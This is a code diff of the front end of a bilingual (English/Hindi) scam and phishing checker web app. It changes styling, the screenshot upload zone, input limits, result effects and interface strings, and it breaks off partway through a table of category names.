-  .live-panel{
-    margin-top:10px; display:flex; flex-direction:column; gap:8px;
-    max-height:0; overflow:hidden; opacity:0;
-    transition:max-height .3s ease, opacity .3s ease;
-  }
-  .live-panel.open{ max-height:400px; opacity:1; overflow-y:auto; }
-  .live-chip{
-    display:flex; gap:10px; align-items:flex-start; font-size:13px; line-height:1.5;
-    background:var(--surface-soft); border-radius:8px; padding:8px 10px;
-    animation:riseIn .25s ease both;
-  }
+  .live-panel{ margin-top:10px; display:flex; flex-direction:column; gap:8px; max-height:0; overflow:hidden; opacity:0; transition:max-height .3s ease, opacity .3s ease; }
+  .live-panel.open{ max-height:300px; opacity:1; overflow-y:auto; }
+  .live-chip{ display:flex; gap:10px; align-items:flex-start; font-size:13px; line-height:1.5; background:var(--surface-soft); border-radius:8px; padding:8px 10px; animation:riseIn .25s ease both; }
   .live-chip b{ color:var(--danger); font-family:'JetBrains Mono',monospace; font-size:12px; white-space:nowrap; }
   .live-chip.med b{ color:var(--caution); }
   .live-chip span{ color:var(--ink-soft); }
 
-  /* ============ Glass tilt cards ============ */
-  .tilt-card{
-    transform-style:preserve-3d;
-    transition:transform .15s ease-out, box-shadow .15s ease-out;
-    will-change:transform;
-  }
+  /* Gentle 3D tilt for cards */
+  .tilt-card{ transform-style:preserve-3d; transition:transform .15s ease-out, box-shadow .15s ease-out; will-change:transform; }
 
-  /* ============ Speedometer gauge ============ */
-  .gauge-needle{ transform-origin:60px 60px; transition:transform 1.1s cubic-bezier(.22,1,.36,1); }
-
-  /* ============ Radar / confidence chart ============ */
-  .radar-fill{ transition:d 0.8s ease, stroke .3s ease, fill .3s ease; }
-
-  /* ============ Probability bars ============ */
-  .prob-row{ display:flex; align-items:center; gap:10px; margin-bottom:10px; }
-  .prob-row:last-child{ margin-bottom:0; }
-  .prob-label{ width:78px; flex:none; font-size:12.5px; font-weight:600; color:var(--ink-soft); }
-  .prob-track{ flex:1; height:8px; border-radius:99px; background:var(--surface-soft); overflow:hidden; }
-  .prob-fill{ height:100%; border-radius:99px; width:0%; transition:width 1s cubic-bezier(.22,1,.36,1); }
-  .prob-pct{ width:38px; flex:none; text-align:right; font-size:12px; font-weight:700; color:var(--ink); }
-
-  /* ============ Threat graph & domain tree ============ */
-  .graph-node-label{ font-family:'Inter',sans-serif; font-size:11px; font-weight:600; fill:var(--ink); }
-  .graph-edge{ stroke:var(--border); stroke-width:1.6; }
-  .graph-edge.hot{ stroke:var(--danger); }
-  @keyframes dashFlow{ to{ stroke-dashoffset:-16; } }
-  .graph-edge.hot{ stroke-dasharray:4 3; animation:dashFlow 1.2s linear infinite; }
-
-  /* ============ Face / expression icon ============ */
-  .ai-face-mouth{ transition:d .3s ease; }
-
-  /* ============ Confetti / glitch canvas ============ */
-  #fx-canvas{
-    position:fixed; inset:0; width:100%; height:100%;
-    pointer-events:none; z-index:50;
-  }
-
-  /* ============ AI Chat mode ============ */
-  .chat-toggle-row{ display:flex; justify-content:center; margin-top:4px; }
-  .chat-open-btn{
-    font-family:'Inter',sans-serif; font-size:13px; font-weight:600;
-    background:var(--brand-light); color:var(--brand-dark); border:none;
-    border-radius:999px; padding:9px 18px; cursor:pointer;
-    display:flex; align-items:center; gap:7px; transition:background .15s ease;
-  }
-  .chat-open-btn:hover{ background:var(--brand); color:#fff; }
-  .chat-panel{ display:flex; flex-direction:column; gap:10px; }
-  .chat-log{ display:flex; flex-direction:column; gap:10px; max-height:340px; overflow-y:auto; padding-right:2px; }
-  .chat-msg{ max-width:85%; font-size:13.5px; line-height:1.55; padding:10px 13px; border-radius:12px; }
-  .chat-msg.user{ align-self:flex-end; background:var(--brand); color:#fff; border-bottom-right-radius:3px; }
-  .chat-msg.assistant{ align-self:flex-start; background:var(--surface-soft); color:var(--ink); border-bottom-left-radius:3px; }
-  .chat-input-row{ display:flex; gap:8px; }
-  .chat-input-row input{
-    flex:1; font-family:'Inter',sans-serif; font-size:13.5px; padding:10px 13px;
-    border:1.5px solid var(--border); border-radius:10px; outline:none; background:var(--surface-soft);
-  }
-  .chat-input-row input:focus{ border-color:var(--brand); background:var(--surface); }
-  .chat-input-row button{
-    flex:none; background:var(--brand); color:#fff; border:none; border-radius:10px;
-    padding:0 16px; cursor:pointer; font-weight:600; font-size:13px;
-  }
-  .chat-input-row button:disabled{ opacity:.5; cursor:wait; }
-  .chat-suggestions{ display:flex; flex-wrap:wrap; gap:6px; }
-
-  /* ============ Voice ============ */
-  .voice-btn{
-    flex:none; width:34px; height:34px; border-radius:50%; border:1px solid var(--border);
-    background:var(--surface); color:var(--brand); cursor:pointer; display:flex;
-    align-items:center; justify-content:center; transition:all .15s ease;
-  }
-  .voice-btn:hover{ background:var(--brand-light); }
-  .voice-btn.speaking{ background:var(--brand); color:#fff; }
-
-  /* ============ Drag & drop zone ============ */
+  /* Drop zone (photo / file scan) */
   .drop-zone{
-    margin-top:12px; border:1.5px dashed var(--border); border-radius:var(--radius-sm);
-    padding:16px; text-align:center; font-size:12.5px; color:var(--ink-faint);
-    transition:all .15s ease; cursor:pointer;
+    margin-top:14px; border:1.5px dashed var(--border); border-radius:var(--radius-sm); padding:18px; text-align:center;
+    transition:all .15s ease; cursor:pointer; position:relative;
   }
-  .drop-zone.drag-over{ border-color:var(--brand); background:var(--brand-light); color:var(--brand-dark); }
+  .drop-zone.drag-over{ border-color:var(--brand); background:var(--brand-light); }
   .drop-zone input{ display:none; }
-  .drop-preview{ display:flex; align-items:center; gap:10px; margin-top:10px; font-size:12.5px; color:var(--ink-soft); }
-  .drop-preview img{ width:36px; height:36px; object-fit:cover; border-radius:6px; border:1px solid var(--border); }
-  .ocr-progress{ font-size:11.5px; color:var(--brand); margin-top:4px; }
+  .drop-zone-idle{ display:flex; flex-direction:column; align-items:center; gap:8px; }
+  .drop-zone-icon{ width:34px; height:34px; color:var(--brand); }
+  .drop-zone-title{ font-size:13.5px; font-weight:600; color:var(--ink); }
+  .drop-zone-sub{ font-size:12px; color:var(--ink-faint); }
+  .drop-zone-busy{ display:none; align-items:center; gap:12px; text-align:left; }
+  .drop-zone.busy .drop-zone-idle{ display:none; }
+  .drop-zone.busy .drop-zone-busy{ display:flex; }
+  .drop-thumb{ width:44px; height:44px; object-fit:cover; border-radius:8px; border:1px solid var(--border); flex:none; }
+  .drop-progress-label{ font-size:12.5px; color:var(--ink-soft); margin-bottom:5px; }
+  .drop-progress-track{ height:6px; width:100%; min-width:140px; background:var(--surface-soft); border-radius:99px; overflow:hidden; }
+  .drop-progress-fill{ height:100%; width:0%; background:var(--brand); border-radius:99px; transition:width .25s ease; }
+  .drop-error{ margin-top:10px; font-size:12.5px; color:#8f2f2f; background:var(--danger-light); border-radius:8px; padding:9px 12px; text-align:left; }
+  .drop-error button{ margin-left:8px; font-size:12px; font-weight:600; background:none; border:none; color:#8f2f2f; text-decoration:underline; cursor:pointer; padding:0; }
+  .drop-success{ margin-top:10px; font-size:12.5px; color:var(--brand-dark); background:var(--safe-light); border-radius:8px; padding:9px 12px; text-align:left; }
 
-  /* ============ Terminal mode ============ */
   .terminal-toggle{
-    position:fixed; bottom:18px; right:18px; z-index:40;
-    width:44px; height:44px; border-radius:50%; border:1px solid var(--border);
-    background:var(--surface); color:var(--ink-soft); cursor:pointer;
-    display:flex; align-items:center; justify-content:center; box-shadow:var(--shadow-md);
-    transition:all .15s ease;
+    position:fixed; bottom:18px; right:18px; z-index:40; width:44px; height:44px; border-radius:50%; border:1px solid var(--border);
+    background:var(--surface); color:var(--ink-soft); cursor:pointer; display:flex; align-items:center; justify-content:center;
+    box-shadow:var(--shadow-md); transition:all .15s ease;
   }
   .terminal-toggle:hover{ color:var(--brand); }
   body.terminal-mode{ background:#0B1210; }
   body.terminal-mode #bg-canvas{ opacity:0.9; }
   body.terminal-mode .card, body.terminal-mode .section, body.terminal-mode .verdict-card, body.terminal-mode .assistant-bubble{
-    background:#0F1B17; border-color:#1E3A31; color:#B9F5DA;
-    box-shadow:0 0 0 1px #1E3A31, 0 8px 24px rgba(0,0,0,0.4);
+    background:#0F1B17; border-color:#1E3A31; color:#B9F5DA; box-shadow:0 0 0 1px #1E3A31, 0 8px 24px rgba(0,0,0,0.4);
   }
   body.terminal-mode h1, body.terminal-mode .brand-name, body.terminal-mode .section-title,
   body.terminal-mode .verdict-summary, body.terminal-mode .finding-desc, body.terminal-mode .ai-body,
   body.terminal-mode .subhead, body.terminal-mode .checklist-row, body.terminal-mode .evidence-block,
-  body.terminal-mode .chat-msg.assistant{
+  body.terminal-mode .assistant-line{
     color:#B9F5DA !important; font-family:'JetBrains Mono', monospace !important;
   }
-  body.terminal-mode .evidence-block, body.terminal-mode textarea, body.terminal-mode .surface-soft,
-  body.terminal-mode .live-chip, body.terminal-mode .checklist-toggle{
+  body.terminal-mode .evidence-block, body.terminal-mode textarea, body.terminal-mode .live-chip, body.terminal-mode .checklist-toggle{
     background:#08110E !important;
   }
   body.terminal-mode .analyze-btn{ background:#12A37E; box-shadow:0 0 16px rgba(18,163,126,0.5); }
+
+  .sr-only{ position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0; }
 </style>
 </head>
 <body>
-<canvas id="bg-canvas"></canvas>
-<canvas id="fx-canvas"></canvas>
+<canvas id="bg-canvas" aria-hidden="true"></canvas>
+<canvas id="fx-canvas" aria-hidden="true"></canvas>
 <button class="terminal-toggle" id="terminal-toggle" title="Toggle terminal mode" aria-label="Toggle terminal mode">
   <svg width="19" height="19" viewBox="0 0 19 19" fill="none"><rect x="2" y="3" width="15" height="13" rx="2" stroke="currentColor" stroke-width="1.6"/><path d="M5.5 7 L8.5 9.5 L5.5 12" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/><path d="M10 12 H13.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
 </button>
@@ -867,11 +388,9 @@
       </span>
       <span class="brand-name" data-i18n="title">AI Red Flag Detector</span>
     </div>
-    <div style="display:flex; align-items:center; gap:10px;">
-      <div class="lang-toggle" id="lang-toggle">
-        <button class="lang-btn active" data-lang="en">EN</button>
-        <button class="lang-btn" data-lang="hi">हिंदी</button>
-      </div>
+    <div class="lang-toggle" id="lang-toggle">
+      <button class="lang-btn active" data-lang="en">EN</button>
+      <button class="lang-btn" data-lang="hi">हिंदी</button>
     </div>
   </div>
 
@@ -881,7 +400,7 @@
   </div>
 
   <div class="card">
-    <div class="mode-tabs" id="mode-tabs">
+    <div class="mode-tabs" id="mode-tabs" role="tablist">
       <button class="mode-tab active" data-mode="auto" data-i18n="modeAuto">Auto detect</button>
       <button class="mode-tab" data-mode="message" data-i18n="modeMessage">Message / Email</button>
       <button class="mode-tab" data-mode="url" data-i18n="modeUrl">Link</button>
@@ -890,25 +409,28 @@
 
     <div class="textarea-wrap live-highlight-wrap tilt-card" id="textarea-tilt">
       <pre class="live-highlight-mirror" id="live-mirror" aria-hidden="true"></pre>
-      <textarea id="input-text" data-i18n-placeholder="placeholderAuto" placeholder="Paste a suspicious email, link, or code snippet here..." spellcheck="false"></textarea>
+      <textarea id="input-text" data-i18n-placeholder="placeholderAuto" placeholder="Paste a suspicious email, link, or code snippet here..." spellcheck="false" maxlength="6000"></textarea>
       <div class="scan-overlay" id="scan-overlay"><div class="grid-flicker"></div><div class="sweep-line"></div></div>
     </div>
+    <div class="char-count" id="char-count">0 / 6000</div>
     <div class="live-panel" id="live-panel"></div>
 
-    <div class="drop-zone" id="drop-zone" tabindex="0" role="button" aria-label="Drop or select a file to scan">
-      <span id="drop-zone-label">📎 Drop a screenshot, or click to pick an image — we'll read the text and scan it</span>
-      <input type="file" id="drop-input" accept="image/*,.txt,.eml">
-      <div class="drop-preview" id="drop-preview" style="display:none;"></div>
-    </div>
-
-    <p class="examples-label" data-i18n="tryExample">Or try an example</p>
-    <div class="examples">
-      <button class="chip" data-example="phishing" data-mode="message" data-i18n="exPhishing">📧 Fake shipping email</button>
-      <button class="chip" data-example="url" data-mode="url" data-i18n="exUrl">🔗 Sketchy link</button>
-      <button class="chip" data-example="code" data-mode="code" data-i18n="exCode">💻 Malicious code</button>
-      <button class="chip" data-example="scareware" data-mode="message" data-i18n="exScareware">☎️ Tech support scam</button>
-      <button class="chip" data-example="crypto" data-mode="message" data-i18n="exCrypto">💰 Crypto scam</button>
-      <button class="chip" data-example="typosquat" data-mode="url" data-i18n="exTyposquat">🎭 Lookalike domain</button>
+    <div class="drop-zone" id="drop-zone" tabindex="0" role="button" data-i18n-aria="dropZoneAria" aria-label="Drop or select a file to scan">
+      <div class="drop-zone-idle">
+        <svg class="drop-zone-icon" viewBox="0 0 34 34" fill="none"><rect x="3" y="6" width="28" height="22" rx="3" stroke="currentColor" stroke-width="1.7"/><circle cx="11" cy="13" r="2.4" stroke="currentColor" stroke-width="1.5"/><path d="M4 24 L12 17 L18 22 L23 16 L30 23" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <div class="drop-zone-title" data-i18n="dropTitle">Drop a screenshot, or click to pick an image</div>
+        <div class="drop-zone-sub" data-i18n="dropSub">We'll read the text in it and scan that — JPG, PNG, or WebP, up to 8MB</div>
+      </div>
+      <div class="drop-zone-busy" id="drop-zone-busy">
+        <img class="drop-thumb" id="drop-thumb" alt="">
+        <div style="flex:1; min-width:0;">
+          <div class="drop-progress-label" id="drop-progress-label">Reading the image…</div>
+          <div class="drop-progress-track"><div class="drop-progress-fill" id="drop-progress-fill"></div></div>
+        </div>
+      </div>
+      <input type="file" id="drop-input" accept="image/png,image/jpeg,image/webp">
+      <div class="drop-error" id="drop-error" style="display:none;"></div>
+      <div class="drop-success" id="drop-success" style="display:none;"></div>
     </div>
 
     <button class="analyze-btn" id="analyze-btn">
@@ -919,34 +441,38 @@
     <p class="helper-note" data-i18n="helperNote">Nothing you paste here is saved — it's only used to run this check.</p>
   </div>
 
-  <div id="results-wrap"></div>
+  <div id="results-wrap" aria-live="polite"></div>
 
   <footer>
-    <span data-i18n="footer">
-        Built to help you spot patterns, not replace your judgment.
-    </span><br>
-
-    <span data-i18n="footerSub">
-        Always verify important messages directly with the sender or organization.
-    </span><br>
-
+    <span data-i18n="footer">Built to help you spot patterns, not replace your judgment.</span><br>
+    <span data-i18n="footerSub">Always verify important messages directly with the sender or organization.</span><br>
     <span class="signature">#SNEMANYU</span>
-</footer>
+  </footer>
+</div>
 
 <script>
+/* ==========================================================================
+   Config
+   ========================================================================== */
 const API_BASE = "https://ai-red-flag-detector.onrender.com";
+const MAX_CHARS = 6000;
+const MAX_IMAGE_BYTES = 8 * 1024 * 1024;
+
+/* ==========================================================================
+   State
+   ========================================================================== */
 let currentEvidenceText = "";
 let currentMatches = [];
 let currentHeuristicScore = 0;
 let currentLang = "en";
-let hasResult = false;
 let currentTier = 'pending';
-let ocrLoaded = false;
-let chatHistory = [];
+let isAnalyzing = false;
+let lastState = null;
+let lastFxTier = null; // only trigger confetti/glitch once per fresh result, not on re-render
 
-/* ============================================================
-   Ambient particle background — subtle "AI nodes" network
-   ============================================================ */
+/* ==========================================================================
+   Ambient particle background
+   ========================================================================== */
 (function initBgCanvas(){
   const canvas = document.getElementById('bg-canvas');
   const ctx = canvas.getContext('2d');
@@ -1005,9 +531,9 @@ let chatHistory = [];
   if(!reduceMotion) requestAnimationFrame(tick); else tick();
 })();
 
-/* ============================================================
-   FX canvas — confetti (safe) / glitch particles (flagged)
-   ============================================================ */
+/* ==========================================================================
+   FX canvas — confetti (safe) / glitch flash (flagged). Fires once per fresh result.
+   ========================================================================== */
 const fxCanvas = document.getElementById('fx-canvas');
 const fxCtx = fxCanvas.getContext('2d');
 function resizeFx(){ fxCanvas.width = window.innerWidth; fxCanvas.height = window.innerHeight; }
@@ -1066,23 +592,28 @@ function triggerGlitch(){
   requestAnimationFrame(step);
 }
 
-function setMood(tier){
+function setMood(tier, isFreshResult){
   currentTier = tier;
   document.body.classList.remove('mood-safe','mood-caution','mood-flagged');
   if(tier === 'safe') document.body.classList.add('mood-safe');
   else if(tier === 'caution') document.body.classList.add('mood-caution');
   else if(tier === 'flagged') document.body.classList.add('mood-flagged');
-  if(tier === 'safe') triggerConfetti('#1F9D64');
-  if(tier === 'flagged') triggerGlitch();
+  // Only fire the one-shot FX when this is a genuinely new result, not a re-render
+  // triggered by a language switch or a retry that landed on the same tier.
+  if(isFreshResult && lastFxTier !== tier){
+    lastFxTier = tier;
+    if(tier === 'safe') triggerConfetti('#1F9D64');
+    if(tier === 'flagged') triggerGlitch();
+  }
 }
 
-/* ============================================================
-   Terminal mode toggle
-   ============================================================ */
 document.getElementById('terminal-toggle').addEventListener('click', () => {
   document.body.classList.toggle('terminal-mode');
 });
 
+/* ==========================================================================
+   Icons
+   ========================================================================== */
 const ICONS = {
   shieldCheck: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M8 11.5 L10.8 14.3 L16 8.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
   shieldAlert: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 8 V13" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16.2" r="1.15" fill="currentColor"/></svg>`,
@@ -1097,14 +628,16 @@ const ICONS = {
   chevronDown: `<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M4 6 L8 10 L12 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
 };
 
-/* AI assistant "face" — expression changes with the verdict */
 const AI_FACE_ICONS = {
-  thinking: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="7" cy="9" r="1.3" fill="currentColor"/><circle cx="13" cy="9" r="1.3" fill="currentColor"/><path class="ai-face-mouth" d="M7.5 13.5 Q10 12.3 12.5 13.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" fill="none"/></svg>`,
-  safe: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M6.5 9 L7.5 10 L9 8.3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M11 9 L12 10 L13.5 8.3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path class="ai-face-mouth" d="M6.5 12.5 Q10 15.5 13.5 12.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
-  caution: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="7" cy="9" r="1.3" fill="currentColor"/><circle cx="13" cy="9" r="1.3" fill="currentColor"/><path class="ai-face-mouth" d="M7 13.5 H13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
-  flagged: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M6 8 L8 10 M8 8 L6 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M12 8 L14 10 M14 8 L12 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path class="ai-face-mouth" d="M6.5 14 Q10 11.5 13.5 14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
+  thinking: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="7" cy="9" r="1.3" fill="currentColor"/><circle cx="13" cy="9" r="1.3" fill="currentColor"/><path d="M7.5 13.5 Q10 12.3 12.5 13.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" fill="none"/></svg>`,
+  safe: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M6.5 9 L7.5 10 L9 8.3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M11 9 L12 10 L13.5 8.3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M6.5 12.5 Q10 15.5 13.5 12.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
+  caution: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="7" cy="9" r="1.3" fill="currentColor"/><circle cx="13" cy="9" r="1.3" fill="currentColor"/><path d="M7 13.5 H13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
+  flagged: `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M6 8 L8 10 M8 8 L6 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M12 8 L14 10 M14 8 L12 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M6.5 14 Q10 11.5 13.5 14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>`,
 };
 
+/* ==========================================================================
+   i18n strings
+   ========================================================================== */
 const NARRATION = {
   en: {
     hello: "Hi — let me take a look at this.",
@@ -1122,6 +655,433 @@ const NARRATION = {
   }
 };
 
+const STRINGS = {
+  en: {
+    title: "AI Red Flag Detector",
+    heroTitle: 'Not sure if it\'s <span class="accent">safe</span>?',
+    subhead: "Paste a message, link, or bit of code below. We'll scan it against known scam patterns and get a second opinion from AI — then explain what we found in plain language.",
+    modeAuto: "Auto detect", modeMessage: "Message / Email", modeUrl: "Link", modeCode: "Code",
+    placeholderAuto: "Paste a suspicious email, link, or code snippet here...",
+    placeholderMessage: "Paste the full email or message text here...",
+    placeholderUrl: "Paste the suspicious link here...",
+    placeholderCode: "Paste the code snippet here...",
+    analyzeBtn: "Check it",
+    analyzing: "Checking…",
+    helperNote: "Nothing you paste here is saved — it's only used to run this check.",
+    footer: "Built to help you spot patterns, not replace your judgment.",
+    footerSub: "Always verify important messages directly with the sender or organization.",
+    dropTitle: "Drop a screenshot, or click to pick an image",
+    dropSub: "We'll read the text in it and scan that — JPG, PNG, or WebP, up to 8MB",
+    dropZoneAria: "Drop or select a screenshot to scan",
+    dropReading: "Reading text from the image…",
+    dropDone: (n) => `Found ${n} characters of text — review it below, then check it.`,
+    dropNone: "Couldn't find any readable text in that image. Try a clearer screenshot, or paste the text directly.",
+    dropTooBig: "That image is over 8MB. Try a smaller screenshot.",
+    dropBadType: "Please use a JPG, PNG, or WebP image.",
+    dropEngineFail: "Couldn't load the text-reading engine — check your connection and try again, or paste the text directly.",
+    dismiss: "Dismiss",
+    yourText: "Your text, with flags highlighted",
+    yourTextSub: "Hover a highlight to see why it was flagged",
+    whatWeFound: "What we found",
+    whatWeFoundSub: (n) => n === 1 ? "1 thing worth a closer look" : `${n} things worth a closer look`,
+    nothingFound: "Nothing here matched our known red-flag patterns. See the AI's take below for a second, more contextual opinion.",
+    nothingFoundButAiFlagged: "Our pattern scan didn't catch anything specific — but the AI's read below raised the risk score, so it's still worth a careful look.",
+    fullChecklist: "See everything we checked",
+    fullChecklistSub: "Every pattern we scan for, including the ones that didn't fire",
+    aiTake: "AI's second opinion",
+    aiTakeSub: "Looks at intent and context, not just keywords",
+    aiPending: "Reading it over for anything the pattern scan might miss…",
+    aiUnavailable: "Couldn't reach the AI analyst",
+    finalVerdictFallback: "The result above is based on the pattern scan only.",
+    retryAi: "Try again",
+    riskScore: "Risk score",
+    verdictSafe: "Looks safe",
+    verdictCaution: "Worth a second look",
+    verdictFlagged: "Red flag",
+    verdictPending: "Checking it now…",
+    summarySafeNoMatches: "Nothing matched our known red-flag patterns. We're still asking the AI for a second opinion, since some scams are new or don't use obvious keywords.",
+    summaryPrefix: "This looks risky because it",
+    joinTwo: ", and it also ",
+    joinLast: ", and ",
+    highSeverityNote: (h, tt) => `${h} of the ${tt} thing${tt>1?'s we found are':' we found is'} high-severity.`,
+    modSeverityNote: "What we found is moderate on its own, but worth being careful about.",
+    patternScan: "Pattern scan", aiAnalystLabel: "AI",
+    confidenceLabel: "Confidence",
+    disagreeNote: "Heads up: the pattern scan alone looked low-risk, but the AI's review raised the score above — its read is reflected in the verdict.",
+  },
+  hi: {
+    title: "AI रेड फ़्लैग डिटेक्टर",
+    heroTitle: 'पक्का नहीं कि यह <span class="accent">सुरक्षित</span> है?',
+    subhead: "नीचे कोई संदेश, लिंक या कोड पेस्ट करें। हम इसे जाने-पहचाने स्कैम पैटर्न से मिलाकर जाँचेंगे और AI से दूसरी राय भी लेंगे — फिर सब कुछ सरल भाषा में समझाएँगे।",
+    modeAuto: "ऑटो डिटेक्ट", modeMessage: "संदेश / ईमेल", modeUrl: "लिंक", modeCode: "कोड",
+    placeholderAuto: "यहाँ संदिग्ध ईमेल, लिंक या कोड स्निपेट पेस्ट करें...",
+    placeholderMessage: "पूरा ईमेल या संदेश यहाँ पेस्ट करें...",
+    placeholderUrl: "संदिग्ध लिंक यहाँ पेस्ट करें...",
+    placeholderCode: "कोड स्निपेट यहाँ पेस्ट करें...",
+    analyzeBtn: "जाँच करें",
+    analyzing: "जाँच हो रही है…",
+    helperNote: "यहाँ पेस्ट की गई कोई भी चीज़ सेव नहीं होती — इसका उपयोग सिर्फ़ यह जाँच चलाने के लिए होता है।",
+    footer: "यह टूल पैटर्न पहचानने में मदद करता है, आपके फ़ैसले की जगह नहीं लेता।",
+    footerSub: "ज़रूरी संदेशों की पुष्टि हमेशा भेजने वाले या संस्था से सीधे करें।",
+    dropTitle: "स्क्रीनशॉट डालें, या इमेज चुनने के लिए क्लिक करें",
+    dropSub: "हम उसमें से टेक्स्ट पढ़कर जाँचेंगे — JPG, PNG या WebP, 8MB तक",
+    dropZoneAria: "जाँचने के लिए स्क्रीनशॉट डालें या चुनें",
+    dropReading: "इमेज से टेक्स्ट पढ़ा जा रहा है…",
+    dropDone: (n) => `${n} अक्षर का टेक्स्ट मिला — नीचे देखें, फिर जाँच करें।`,
+    dropNone: "इस इमेज में कोई पढ़ने योग्य टेक्स्ट नहीं मिला। साफ़ स्क्रीनशॉट आज़माएँ, या टेक्स्ट सीधे पेस्ट करें।",
+    dropTooBig: "यह इमेज 8MB से बड़ी है। कोई छोटा स्क्रीनशॉट आज़माएँ।",
+    dropBadType: "कृपया JPG, PNG या WebP इमेज का उपयोग करें।",
+    dropEngineFail: "टेक्स्ट-पढ़ने वाला इंजन लोड नहीं हो सका — कनेक्शन जाँचें और फिर कोशिश करें, या टेक्स्ट सीधे पेस्ट करें।",
+    dismiss: "बंद करें",
+    yourText: "आपका टेक्स्ट, चिन्हित हिस्सों के साथ",
+    yourTextSub: "क्यों चिन्हित किया गया, यह देखने के लिए हाइलाइट पर होवर करें",
+    whatWeFound: "हमें क्या मिला",
+    whatWeFoundSub: (n) => n === 1 ? "1 चीज़ ध्यान देने लायक" : `${n} चीज़ें ध्यान देने लायक`,
+    nothingFound: "यहाँ हमारे जाने-पहचाने रेड-फ़्लैग पैटर्न से कुछ नहीं मिला। नीचे AI की दूसरी, अधिक संदर्भ-आधारित राय देखें।",
+    nothingFoundButAiFlagged: "हमारे पैटर्न स्कैन को कुछ खास नहीं मिला — लेकिन नीचे AI की राय ने जोखिम स्कोर बढ़ाया है, इसलिए ध्यान से देखना ठीक रहेगा।",
+    fullChecklist: "हमने जो कुछ भी जाँचा वह देखें",
+    fullChecklistSub: "हर वह पैटर्न जिसकी हम जाँच करते हैं, वे भी जो नहीं मिले",
+    aiTake: "AI की दूसरी राय",
+    aiTakeSub: "सिर्फ़ शब्दों को नहीं, इरादे और संदर्भ को भी देखता है",
+    aiPending: "पैटर्न स्कैन जो चूक सकता है, उसके लिए इसे ध्यान से पढ़ा जा रहा है…",
+    aiUnavailable: "AI विश्लेषक से संपर्क नहीं हो सका",
+    finalVerdictFallback: "ऊपर दिया गया परिणाम केवल पैटर्न स्कैन पर आधारित है।",
+    retryAi: "फिर से कोशिश करें",
+    riskScore: "जोखिम स्कोर",
+    verdictSafe: "सुरक्षित लगता है",
+    verdictCaution: "थोड़ा ध्यान देने लायक",
+    verdictFlagged: "रेड फ़्लैग",
+    verdictPending: "जाँच हो रही है…",
+    summarySafeNoMatches: "हमारे जाने-पहचाने रेड-फ़्लैग पैटर्न से कुछ नहीं मिला। हम फिर भी AI से दूसरी राय ले रहे हैं, क्योंकि कुछ स्कैम नए होते हैं या सीधे शब्दों का इस्तेमाल नहीं करते।",
+    summaryPrefix: "यह जोखिम भरा लगता है क्योंकि यह",
+    joinTwo: ", और यह भी ",
+    joinLast: ", और ",
+    highSeverityNote: (h, tt) => `${tt} में से ${h} चीज़ें उच्च-गंभीरता वाली हैं।`,
+    modSeverityNote: "जो मिला वह अकेले मध्यम स्तर का है, लेकिन सावधानी बरतना ठीक रहेगा।",
+    patternScan: "पैटर्न स्कैन", aiAnalystLabel: "AI",
+    confidenceLabel: "विश्वास स्तर",
+    disagreeNote: "ध्यान दें: अकेले पैटर्न स्कैन में जोखिम कम लगा, लेकिन AI की समीक्षा ने ऊपर स्कोर बढ़ाया है — फ़ैसले में उसकी राय भी शामिल है।",
+  }
+};
+function t(key){ return STRINGS[currentLang][key]; }
+
+/* Category names, translated */
+const CAT_NAMES = {
+  en: {
+    phishing: "Social Engineering / Phishing",
+    url: "Malicious URL Pattern",
+    code: "Code Injection (Web/Command)",
+    malware: "Malware / Scareware",
+    crypto: "Crypto & Financial Scam",
+  },
+  hi: {
+    phishing: "सोशल इंजीनियरिंग / फ़िशिंग",
+    url: "संदिग्ध यूआरएल पैटर्न",
+    code: "कोड इंजेक्शन (वेब/कमांड)",
+    malware: "मैलवेयर / स्केयरवेयर",
